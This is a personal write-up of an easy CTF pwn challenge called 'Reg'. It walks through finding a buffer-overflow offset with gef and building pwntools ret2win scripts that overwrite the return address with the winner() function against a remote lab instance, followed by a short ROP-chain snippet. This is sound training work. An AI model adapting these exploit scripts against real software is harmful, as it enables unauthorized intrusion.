# Reg Helped-Through

Name: Reg
Type: Pwn
Date:  2/3/2024
Difficulty:  Easy
Goals:  
- Begin the learn to Pwn all the things with Retired Box with CryptoCat, Active box 
- See how far I can get in an hour
Learnt:
- Add on review

Firstly, disclaimer I know this is a Simple buffer from starting the [[Jeeves-Writeup]] so my initial enumeration of the binary will be in the directory, but not discussed as I would rather focus on the flat methodology and get this done. So strings
![](enum.png)

```c
gef> pattern create <size>
# copy and paste 
run <paste pattern at correct stage of the program>
# look at *sp register address 
gef> pattern search $string_in_rsp
```

![](overflowingforrsp.png)

Then I am wondering how it actually returns the flag
![](r2d2regafl.png)
Checking interesting functions
![](pdfinterestingfunctions1.png)
Checking `initialize()`
![](syminitialize.png)
WTF is `alarm()`
![](whatisalarm.png)

So presumable we need to connect to an instance to then get the flag as it is read from a filesystem.  So I guess we then just need to put the `winner()` in `RIP` and BAM flag if I can figure out how to connect and script with pwntools. 
![](testingconnection.png)

https://es7evam.gitbook.io/security-studies/exploitation/sockets/03-connections-with-pwntools

Then Gef and gdb went weird so I had to stop. After updating my script to make it a bastardize XCT and John Hammond for that full Germanic Ginger Swooping python. I tried just making shellcode that was the function, but ...
```python
from pwn import *

context.terminal = ['tmux', 'new-window']
target = './reg'
context.binary = target
binary = ELF(target)

rhost = "94.237.56.248" 
rport = 49910 

offset = 56
shellcode = b"\x77\x69\x6e\x6e\x65\x72\x28\x29" # winner()

payload = b"".join([
            b"A" * offset,
            shellcode,
        ])


if args['PWN']:
    r = remote(rhost, rport) 
    r.send(payload)
    r.recv()
else:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendline(payload)
```
In wonder why it did not work
![](regtowin.png)
Then pack it into 32 bits
![](thenmadeitp32.png)

Add `time.sleep(10)` to view this better:
![](wiener.png)

I made some further tweaks, but still failed.
```python
from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './reg'
context.binary = target
binary = ELF(target)

rhost = "94.237.56.248" 
rport = 49910 

offset = 56
shellcode = p32(binary.symbols["winner"])
info("%#x target", binary.symbols.winner)

payload = b"".join([
            b"A" * offset,
            shellcode,
        ])

if args['PWN']:
    r = remote(rhost, rport) 
    r.recvline()
    r.send(payload)
    flag = r.recvline()
    print(f"The flag is {flag}")
    r.close()
else:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.recvline()
    p.sendline(payload)
    time.sleep(10)
    p.recvline()
    p.close()
```


I think that I have absolutely improved my:
- understanding of `pwntools`
- connecting the dots without knowing what ret2win was before finding out about the concept


```python
```
#### Official Writeup 

As stated with these early retired machine I just want 1:1 ratio of Writeups and Help-Throughs and I have put in the time and actually need to put in more time to reach that ratio. 

![](handleshaveaddressvegetableidiot.png)

- My scripting was also incorrect
-  [pwnlib.elf.elf.ELF.flat](https://docs.pwntools.com/en/stable/elf/elf.html#pwnlib.elf.elf.ELF.flat)

sendlineafter()
recvuntil()
elf.functions.winner
```c
# enumerate functions
info functions
```

ROP chains with CryptoCat
```python
from pwn import *

rop = ROP(elf)
pprint(rop.gadgets)

rop.winner()
rop_chain = rop.chain()
info("rop chain: %r", rop_chain)

print(rop.dump())
```

![](fakeflagtotestreadingtherealflag.png)

And it worked!
## Post-Completion Reflection

- Misread the endianness from before
- handles -> address; the old you found a way that works and tried it, but did not work actually the step back and enumerate how something exists as is:
	- not just a function handle on the symbol table... but also an address in memory

https://pentestbook.six2dez.com/others/exploiting
https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef

- CryptoCat is that person that quses python2